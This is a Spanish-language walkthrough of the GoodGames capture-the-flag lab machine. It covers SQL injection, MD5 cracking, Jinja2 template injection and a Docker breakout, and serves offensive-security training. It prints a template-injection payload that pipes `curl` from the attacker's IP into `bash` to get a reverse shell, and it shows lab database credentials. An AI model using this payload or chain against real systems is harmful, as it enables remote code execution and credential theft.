# GoodGames

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: SQLI (Error Based) /
Hash Cracking Weak Algorithms /
Password Reuse /
Server Side Template Injection (SSTI) /
Docker Breakout (Privilege Escalation) [PIVOTING]

Te prepara para las **Certificaciones**: eJPT eWPT eCPPTv3 OSCP (Escalada) <br><br>

![goodgames](https://github.com/user-attachments/assets/e503fca8-b7b0-4250-b81c-3c892bb91b89)<br><br>


# Reconocimiento

Utilizando `nmap` vemos los puertos mas comunes<br>
![image](https://github.com/user-attachments/assets/42773b8d-37d2-4fa5-a7fc-3c5d7fd18214)<br>


- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"


Utilizando `nmap` lanzamos los scripts mas comunes.<br>
![image](https://github.com/user-attachments/assets/e728f257-29df-483e-824e-d961d98ee0e1)<br><br>


# Explotación SQL

Ingresamos al Usuario admin<br>
![image](https://github.com/user-attachments/assets/1a5044f3-efd2-4a70-9cd8-999df661995b)<br><br>

En `/etc/hosts` ponemos el subdominio<br>
![image](https://github.com/user-attachments/assets/e56b8b98-fba8-4d2c-90f2-0bc36b97eb05)
<br><br>

Utilizando `burpsuite` mediante una inyección SQL vemos las columnas.<br>
![image](https://github.com/user-attachments/assets/304c0d44-5bae-488e-9e06-4f39e10df260)<br><br>


Encontramos la contraseña de admin cifrada<br>
![image](https://github.com/user-attachments/assets/2321141c-2d30-4806-8821-4b43a36cabf6)<br><br>


Descubrimos la contraseña utilizando `john`.<br>
![image](https://github.com/user-attachments/assets/3e6a045c-43e0-410f-bb7a-e9d9e612821f)<br>
- `-w` -> le indicamos el diccionario a usar.
- `hash` -> Contraseña a crackear.
- `--format=Raw-MD5` -> Formato MD5.<br><br>


# Explotación SSTI

Identificación del campo para el SSTI
![image](https://github.com/user-attachments/assets/48c64ab7-3dbd-41ec-9a36-d5614bf4053e)


## Paso 1

Creo este index.html<br>

![image](https://github.com/user-attachments/assets/5e4a0381-66a3-452f-8722-64872aec2dbd)<br><br>


## Paso 2

Abro servidor Python por el puerto 80<br>

![image](https://github.com/user-attachments/assets/8e288815-ca96-41b5-a83e-91cfe1e7a9b2)<br><br>


## Paso 3

Me pongo en escucha<br>
![image](https://github.com/user-attachments/assets/029a65ce-76a3-43a3-80c5-1e1bcac6ea4d)<br><br>


## Paso 4

Abro el index con `curl` y lo interpreto con `bash`<br>

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.33 | bash').read() }}
```
<br><br>

# Escalada de privilegios

Estoy en una montura, por que el usuario augustus no existe en /etc/passwd<br>
![image](https://github.com/user-attachments/assets/434fb5d6-cdb9-4065-8f18-8fd0fd98d486)<br><br>


Detectar puertos abiertos:<br>
![image](https://github.com/user-attachments/assets/a28bac53-19e1-4c0b-a088-906180c14b6b)<br><br>


Creamos script de `bash` para encontrar puertos abiertos, lo convertimos a base64.<br>
![image](https://github.com/user-attachments/assets/598682c9-6583-48b2-9504-064030f03cfc)<br><br>

Vemos el puerto 22 abierto:<br>
![image](https://github.com/user-attachments/assets/79d679fc-86c0-404a-afd6-04a749d30101)<br><br>

Nos conectamos como augustus con la contraseña "superadministrator"<br>
![image](https://github.com/user-attachments/assets/8fed4e6e-7548-4511-a4f0-b6f4e27e66e5)<br><br>

Encontramos las credenciales para la base de datos<br>
![image](https://github.com/user-attachments/assets/63cebcba-c6b2-4784-a286-4bc50090337b)<br><br>

- `  mysql -u 'main_admin' -D 'main' -h 127.0.0.1 -p   `
- `C4n7_Cr4cK_7H1S_pasSw0Rd!`

- `show databases;` -> Nos muestra las bases de datos
- `use main;` -> Para usar una base de datos
- `show tables; ` -> Para ver las tablas
- `describe user;` -> Para ver las columnas
- `select name,password from user;` -> Para ver los datos en name y password

Le hacemos un ataque de fuerza bruta con `john`<br>
![image](https://github.com/user-attachments/assets/6f33f592-f6e3-4a2b-966f-6fb30bfa42a7)<br><br>

Encontramos una contraseña:<br>
![image](https://github.com/user-attachments/assets/2cc3a90d-b2a5-485d-b091-a6f5d28855e0)<br><br>


![image](https://github.com/user-attachments/assets/f9fe19eb-b24d-46fd-a367-9ece07336933)<br><br>

Flag:<br>
![image](https://github.com/user-attachments/assets/e3595a3c-c2ff-44dd-8f80-3d42f816b18c)<br><br>

